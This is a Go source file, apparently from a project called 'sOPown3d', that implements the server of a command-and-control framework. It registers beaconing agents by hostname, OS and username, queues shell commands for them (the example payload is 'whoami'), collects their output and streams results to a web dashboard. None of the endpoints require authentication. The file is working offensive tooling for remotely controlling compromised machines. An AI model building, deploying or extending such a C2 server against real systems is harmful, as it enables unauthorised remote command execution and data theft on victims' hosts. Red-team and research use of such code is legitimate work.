package server

import (
	"context"
	"encoding/json"
	"net/http"
	"sOPown3d/pkg/shared"
	"sOPown3d/server/logger"
	"sOPown3d/server/storage"
	"time"
)

// handleDashboard serves the main dashboard page
func (s *Server) handleDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	s.templates.ExecuteTemplate(w, "dashboard.html", nil)
}

func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}

	var info shared.AgentInfo
	if err := json.NewDecoder(r.Body).Decode(&info); err != nil {
		http.Error(w, "invalid beacon data", http.StatusBadRequest)
		return
	}

	if info.Hostname == "" {
		http.Error(w, "missing hostname", http.StatusBadRequest)
		return
	}

	// Use hostname as agent ID (matches agent behavior)
	agentID := info.Hostname

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	agent := &storage.Agent{
		AgentID:  agentID,
		Hostname: info.Hostname,
		OS:       info.OS,
		Username: info.Username,
		LastSeen: time.Now(),
		IsActive: true,
	}

	if err := s.store.UpsertAgent(ctx, agent); err != nil {
		s.logger.Error(logger.CategoryError, "Failed to upsert agent %s: %v", agentID, err)
	}

	s.logger.Info(logger.CategoryServer, "Beacon from agent %s (%s/%s)", agentID, info.Hostname, info.OS)

	// Check for pending command
	cmd, exists := s.pendingCommands[agentID]
	if exists {
		delete(s.pendingCommands, agentID)
		s.lastCommandSent[agentID] = cmd
	}

	w.Header().Set("Content-Type", "application/json")

	if exists {
		s.logger.Info(logger.CategoryServer, "Sending command to agent %s: %s", agentID, cmd.Action)
		json.NewEncoder(w).Encode(cmd)
	} else {
		json.NewEncoder(w).Encode(shared.Command{Action: ""})
	}
}

// handleSendCommand queues a command for an agent (from web UI)
// POST: { "id": "agent-xxx", "action": "shell", "payload": "whoami" }
func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}

	var cmd shared.Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, "invalid command data", http.StatusBadRequest)
		return
	}

	if cmd.ID == "" || cmd.Action == "" {
		http.Error(w, "missing agent ID or action", http.StatusBadRequest)
		return
	}

	// Store command for next beacon pickup
	s.pendingCommands[cmd.ID] = cmd

	s.logger.Info(logger.CategoryServer, "Command queued for agent %s: %s %s", cmd.ID, cmd.Action, cmd.Payload)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "queued",
		"agent":   cmd.ID,
		"action":  cmd.Action,
		"payload": cmd.Payload,
	})
}

func (s *Server) handleIngest(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}

	var result struct {
		AgentID string `json:"agent_id"`
		Output  string `json:"output"`
	}

	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "invalid ingest data", http.StatusBadRequest)
		return
	}

	s.logger.Info(logger.CategoryServer, "Ingest from agent %s", result.AgentID)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// Get last command sent to this agent for context
	lastCmd := s.lastCommandSent[result.AgentID]

	exec := &storage.Execution{
		AgentID:        result.AgentID,
		CommandAction:  lastCmd.Action,
		CommandPayload: lastCmd.Payload,
		Output:         result.Output,
		ExecutedAt:     time.Now(),
	}

	if err := s.store.SaveExecution(ctx, exec); err != nil {
		s.logger.Error(logger.CategoryError, "Failed to save execution: %v", err)
	}

	s.broadcastToWS(result.AgentID, result)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "received"})
}

// handleWebSocket upgrades HTTP to WebSocket for real-time updates
func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		s.logger.Error(logger.CategoryError, "WebSocket upgrade failed: %v", err)
		return
	}

	// Use remote address as client key
	clientKey := conn.RemoteAddr().String()

	s.wsMu.Lock()
	s.wsClients[clientKey] = conn
	s.wsMu.Unlock()

	s.logger.Info(logger.CategoryServer, "WebSocket client connected: %s", clientKey)

	// Keep connection alive, remove on disconnect
	defer func() {
		s.wsMu.Lock()
		delete(s.wsClients, clientKey)
		s.wsMu.Unlock()
		conn.Close()
		s.logger.Info(logger.CategoryServer, "WebSocket client disconnected: %s", clientKey)
	}()

	// Read loop (keeps connection alive)
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			break
		}
	}
}

// broadcastToWS sends data to all connected WebSocket clients
func (s *Server) broadcastToWS(agentID string, data interface{}) {
	msg, err := json.Marshal(map[string]interface{}{
		"type":     "execution",
		"agent_id": agentID,
		"data":     data,
	})
	if err != nil {
		return
	}

	s.wsMu.RLock()
	defer s.wsMu.RUnlock()

	for key, conn := range s.wsClients {
		if err := conn.WriteMessage(1, msg); err != nil {
			s.logger.Warn(logger.CategoryServer, "Failed to send to WS client %s: %v", key, err)
		}
	}
}
